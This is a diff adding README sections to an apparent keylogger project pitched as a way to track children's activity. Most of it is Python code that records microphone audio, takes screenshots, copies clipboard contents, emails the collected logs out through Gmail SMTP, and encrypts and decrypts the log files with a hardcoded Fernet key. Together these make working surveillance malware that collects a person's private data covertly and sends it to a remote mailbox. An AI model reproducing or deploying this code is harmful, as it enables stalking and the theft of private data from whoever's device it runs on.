@@ -81,3 +81,105 @@ To track kids activity including keystrokes, audio, screenshots, clipboard data 
             f.write("Private IP Address: " + IPAddr + "\n")
 
     computer_information()
+
+  ## Microphone Functionality
+
+    def microphone():
+      fs = 44100
+      seconds = microphone_time
+  
+      myrecording = sd.rec(int(seconds * fs),samplerate=fs, channels=2)
+      sd.wait()
+  
+      write(file_path + extend + audio_information,fs,myrecording)
+  
+    microphone()
+  
+  ## Screenshot Functionality
+
+    def screenshot():
+      im = ImageGrab.grab()
+      im.save(file_path+  extend + screenshot_information)
+  
+    screenshot()
+
+  ## Clipboard Functionality
+
+    def copy_clipboard():
+      with open(file_path + extend + clipboard_information, "a") as f:
+          try:
+              win32clipboard.OpenClipboard()
+              pasted_data = win32clipboard.GetClipboardData()
+              win32clipboard.CloseClipboard()
+  
+              f.write("Clipboard Data: \n" + pasted_data)
+  
+          except:
+              f.write("Clipboard could be not be copied")
+  
+    copy_clipboard()
+  
+  
+  ## Email Functionality
+
+     def send_email(filename,attachment,toaddr):
+  
+      fromaddr = email_address
+      msg = MIMEMultipart()
+      msg['From'] = fromaddr
+      msg['To'] = toaddr
+      msg['Subject'] = "Log File"
+      body = "body of the mail"
+      msg.attach(MIMEText(body,'plain'))
+  
+      filename = filename
+      attachment = open(attachment,'rb')
+  
+      p = MIMEBase('application','octet-stream')
+      p.set_payload((attachment).read())
+      encoders.encode_base64(p)
+      p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+  
+      msg.attach(p)
+  
+      s = smtplib.SMTP('smtp.gmail.com',587)
+      s.starttls()
+      s.login(fromaddr,password)
+      text = msg.as_string()
+      s.sendmail(fromaddr,toaddr,text)
+      s.quit()
+
+ ## Generating Keys  
+
+    from cryptography.fernet import Fernet
+    
+    key = Fernet.generate_key()
+    file = open("encryption_key.txt","wb")
+    file.write(key)
+    file.close()
+
+ ## Decrypting Files
+
+    from cryptography.fernet import Fernet
+    
+    key ="3Qg7tgyEwaaCBXtE2DBVf3y2zH9BuRuBiWGloJTliMc="
+    
+    keys_information_e = "e_key_log.txt"
+    system_information_e = "e_sys_info.txt"
+    clipboard_information_e = "e_clipboard.txt"
+    
+    encrypted_files = [system_information_e,clipboard_information_e,keys_information_e]
+    count = 0
+    
+    for decrypted_files in encrypted_files:
+    
+        with open(encrypted_files[count], 'rb') as f:
+            data = f.read()
+    
+        fernet = Fernet(key)
+        decrypted = fernet.decrypt(data)
+    
+        with open(encrypted_files[count], 'wb') as f:
+            f.write(decrypted)
+    
+        count += 1
